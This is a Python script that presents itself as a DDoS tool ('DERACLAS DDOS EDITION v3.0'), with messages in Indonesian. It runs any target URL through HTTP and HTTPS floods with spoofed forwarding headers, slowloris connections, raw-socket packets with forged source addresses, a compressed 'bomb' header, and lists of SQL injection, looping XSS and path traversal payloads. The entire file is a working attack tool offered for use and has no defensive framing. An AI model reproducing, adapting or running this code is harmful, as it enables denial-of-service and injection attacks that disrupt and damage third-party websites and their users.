#!/usr/bin/env python3

import sys
import os
import time
import random
import socket
import ssl
import threading
import multiprocessing
import urllib.parse
import urllib3
import http.client
import requests
import struct
import binascii
import ctypes
import resource
import signal
import json
import hashlib
import base64
import zlib
import gzip
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import deque
import queue
import gc

os.system("ulimit -n 999999")
os.system("sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.tcp_tw_recycle=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1")
os.system("sysctl -w net.core.somaxconn=65535 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.tcp_max_syn_backlog=65535 >/dev/null 2>&1")


THREADS = 50000
PROCESSES = 100
TIMEOUT = 0.1
DURATION = float('inf')  

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.instagram.com/',
    'https://www.youtube.com/',
    'https://www.tiktok.com/',
    'https://www.reddit.com/',
]

class PayloadMematikan:
    
    @staticmethod
    def create_super_bomb():
        data = b'\x00' * (1024 * 1024 * 1024)  # 1GB data
        compressed = zlib.compress(data, 9)
        print(f"[+] SUPER BOMB: {len(compressed)} bytes -> 1GB")
        return compressed
    
    @staticmethod
    def create_sql_injection():

        return [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "1' ORDER BY 100--",
            "' OR 1=1--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#",
        ]
    
    @staticmethod
    def create_xss_payload():

        return [
            "<script>while(1){alert('xss')}</script>",
            "<img src=x onerror=while(1){alert('xss')}>",
            "<svg/onload=while(1){alert('xss')}>",
            "<body onload=while(1){alert('xss')}>",
        ]
    
    @staticmethod
    def create_path_traversal():

        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]


class AttackSuper:
    def __init__(self, target):
        self.target = target
        self.parsed = urllib.parse.urlparse(target)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or '/'
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.running = True
        self.stats = {
            'sent': 0,
            'failed': 0,
            'bytes': 0,
            'start_time': time.time()
        }
        self.lock = threading.Lock()
        self.session = self._create_session()
        
        # Generate payloads
        self.super_bomb = PayloadMematikan.create_super_bomb()
        self.sql_payloads = PayloadMematikan.create_sql_injection()
        self.xss_payloads = PayloadMematikan.create_xss_payload()
        self.path_payloads = PayloadMematikan.create_path_traversal()
        
        # IP Spoofing
        self.ip_pool = self._generate_ip_pool()
        
    def _create_session(self):
   
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10000,
            pool_maxsize=100000,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def _generate_ip_pool(self):

        ips = []
        for i in range(10000):
            ips.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        return ips
    
    def _create_headers(self, attack_type='normal'):

        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Referer': random.choice(REFERERS),
            'X-Forwarded-For': random.choice(self.ip_pool),
            'X-Real-IP': random.choice(self.ip_pool),
            'X-Originating-IP': random.choice(self.ip_pool),
            'X-Remote-IP': random.choice(self.ip_pool),
            'X-Remote-Addr': random.choice(self.ip_pool),
            'X-Client-IP': random.choice(self.ip_pool),
            'CF-Connecting-IP': random.choice(self.ip_pool),
            'True-Client-IP': random.choice(self.ip_pool),
            'X-Forwarded-Host': self.host,
            'X-Forwarded-Server': self.host,
            'X-Forwarded-Proto': self.parsed.scheme,
            'X-Host': self.host,
            'X-Forwarded-Port': str(self.port),
        }
        
        # Add random headers for bypass
        if random.random() > 0.5:
            headers['Authorization'] = f"Bearer {hashlib.md5(str(time.time()).encode()).hexdigest()}"
        
        if attack_type == 'bomb':
            headers['Content-Encoding'] = 'gzip'
            headers['X-Bomb'] = base64.b64encode(self.super_bomb[:10000]).decode()
            
        return headers
    
    def _attack_http_flood(self):

        try:
            headers = self._create_headers()
            path = self.path
            
            # Random method
            if random.random() > 0.7:
                method = 'POST'
                data = os.urandom(random.randint(1000, 100000))
                headers['Content-Length'] = str(len(data))
            else:
                method = 'GET'
                data = None
                # Cache buster
                path += f"?{random.randint(1,999999999999)}"
            
            # Kirim request SUPER CEPAT
            response = self.session.request(
                method=method,
                url=f"{self.parsed.scheme}://{self.host}{path}",
                headers=headers,
                data=data,
                timeout=TIMEOUT,
                verify=False,
                allow_redirects=False
            )
            
            with self.lock:
                self.stats['sent'] += 1
                if data:
                    self.stats['bytes'] += len(data)
                    
        except:
            with self.lock:
                self.stats['failed'] += 1
    
    def _attack_slowloris(self):
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            

            sock.send(f"GET {self.path} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            

            for _ in range(1000):
                sock.send(f"X-Random-{random.randint(1,999999)}: {'A'*10000}\r\n".encode())
                time.sleep(0.01)
                
        except:
            pass
    
    def _attack_socket_flood(self):
        
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            # IP Header
            ip_header = struct.pack(
                '!BBHHHBBH4s4s',
                0x45,  # Version + IHL
                0,     # DSCP
                40,    # Total length
                random.randint(0, 65535),  # ID
                0,     # Flags
                64,    # TTL
                socket.IPPROTO_TCP,  # Protocol
                0,     # Checksum
                socket.inet_aton(random.choice(self.ip_pool)),  # Source IP
                socket.inet_aton(self.host)  # Dest IP
            )
            
            # TCP Header
            tcp_header = struct.pack(
                '!HHLLBBHHH',
                random.randint(1024, 65535),  # Source port
                self.port,  # Dest port
                random.randint(0, 4294967295),  # Sequence
                0,  # Ack
                80,  # Data offset + flags
                0,  # Window
                0,  # Checksum
                0   # Urgent
            )
            
            # Kirim packet
            packet = ip_header + tcp_header
            sock.sendto(packet, (self.host, 0))
            
        except:
            pass
    
    def _attack_https_flood(self):

        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            for _ in range(100):  # Batch request
                conn = http.client.HTTPSConnection(self.host, self.port, context=context, timeout=0.1)
                conn.request('GET', self.path, headers=self._create_headers())
                conn.getresponse()
                conn.close()
                
                with self.lock:
                    self.stats['sent'] += 1
                    
        except:
            with self.lock:
                self.stats['failed'] += 1
    
    def _attack_sql_xss(self):

        try:
            path = self.path
            
            # Inject SQL
            if random.random() > 0.5:
                sql = random.choice(self.sql_payloads)
                path += f"?id={urllib.parse.quote(sql)}"
            else:
                # Inject XSS
                xss = random.choice(self.xss_payloads)
                path += f"?search={urllib.parse.quote(xss)}"
            
            headers = self._create_headers()
            
            response = self.session.get(
                f"{self.parsed.scheme}://{self.host}{path}",
                headers=headers,
                timeout=TIMEOUT,
                verify=False
            )
            
            with self.lock:
                self.stats['sent'] += 1
                
        except:
            with self.lock:
                self.stats['failed'] += 1
    
    def _worker(self):
        
        attacks = [
            self._attack_http_flood,
            self._attack_https_flood,
            self._attack_socket_flood,
            self._attack_slowloris,
            self._attack_sql_xss,
        ]
        
        while self.running:
            # Pilih random attack
            attack = random.choice(attacks)
            
            # Execute berkali-kali
            for _ in range(100):  # 100x per iterasi
                if not self.running:
                    break
                attack()
            
            # Delay minimal
            time.sleep(0.0001)
    
    def start(self):

        print(f"\n[+] MEMULAI SERANGAN MEMATIKAN KE {self.target}")
        print(f"[+] THREADS: {THREADS}")
        print(f"[+] PROCESSES: {PROCESSES}")
        print(f"[+] STATUS: TANPA BATAS - JALAN TERUS")
        print("[+] TEKAN CTRL+C UNTUK STOP\n")
        
        # Buat proses
        processes = []
        for p in range(PROCESSES):
            p = multiprocessing.Process(target=self._process_worker)
            p.daemon = True
            processes.append(p)
            p.start()
        
        # Monitor real-time
        try:
            last_sent = 0
            while True:
                time.sleep(1)
                with self.lock:
                    current = self.stats['sent']
                    elapsed = time.time() - self.stats['start_time']
                    rps = current - last_sent
                    last_sent = current
                    
                    # Clear screen dan tampilkan stats
                    os.system('clear' if os.name == 'posix' else 'cls')
                    
                    print("="*60)
                    print("  DDOS TOOLD - DERACLAS DDOS PYTHON")
                    print("="*60)
                    print(f"  TARGET    : {self.target}")
                    print(f"  HOST      : {self.host}")
                    print(f"  PORT      : {self.port}")
                    print(f"  WAKTU     : {elapsed:.0f} detik")
                    print("-"*60)
                    print(f"  REQUEST   : {current:,}")
                    print(f"  RPS       : {rps:,} req/detik")
                    print(f"  FAILED    : {self.stats['failed']:,}")
                    print(f"  DATA      : {self.stats['bytes'] / (1024*1024):.2f} MB")
                    print(f"  SUCCESS   : {((current - self.stats['failed'])/current*100) if current>0 else 0:.1f}%")
                    print("-"*60)
                    print("  STATUS    : ⚡ SERANGAN BERJALAN ⚡")
                    print("="*60)
                    
                    # Visual progress bar
                    bar_length = 50
                    progress = (current % 100) / 100
                    block = int(round(bar_length * progress))
                    text = f"\r  PROGRESS: [{'#' * block + '-' * (bar_length - block)}] {current} req"
                    print(text)
                    
        except KeyboardInterrupt:
            print("\n\n[!] SERANGAN DIHENTIKAN USER")
            self.running = False
            
            # Tampilkan hasil akhir
            print("\n" + "="*60)
            print("  HASIL AKHIR SERANGAN")
            print("="*60)
            print(f"  TOTAL REQUEST : {self.stats['sent']:,}")
            print(f"  TOTAL FAILED  : {self.stats['failed']:,}")
            print(f"  TOTAL DATA    : {self.stats['bytes'] / (1024*1024):.2f} MB")
            print(f"  DURASI        : {time.time() - self.stats['start_time']:.0f} detik")
            print("="*60)
    
    def _process_worker(self):
        """Worker untuk setiap proses"""
        threads = []
        for i in range(THREADS // PROCESSES):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        while self.running:
            time.sleep(1)

# ===================== MAIN =====================
def main():
    # Banner
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║     DDOS TOOLS - DERACLAS DDOS EDITION v3.0            ║
    ║            FLOOD INSTAN + BYPASS TOTAL                   ║
    ║              TANPA BATAS - TANPA TOLAKAN                 ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Cek argument
    if len(sys.argv) < 2:
        print("\n  CARA PAKAI:")
        print("  python3 ddos.py <URL>")
        print("\n  CONTOH:")
        print("  python3 ddos.py https://target.com")
        print("  python3 ddos.py http://192.168.1.1")
        print("  python3 ddos.py https://site.com:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Matikan semua limit
    print("[*] MEMATIKAN SEMUA BATASAN SISTEM...")
    
    # Disable garbage collector
    gc.disable()
    
    # Set signal handler
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    
    # Start attack
    attack = AttackSuper(target)
    attack.start()

if __name__ == "__main__":
    main()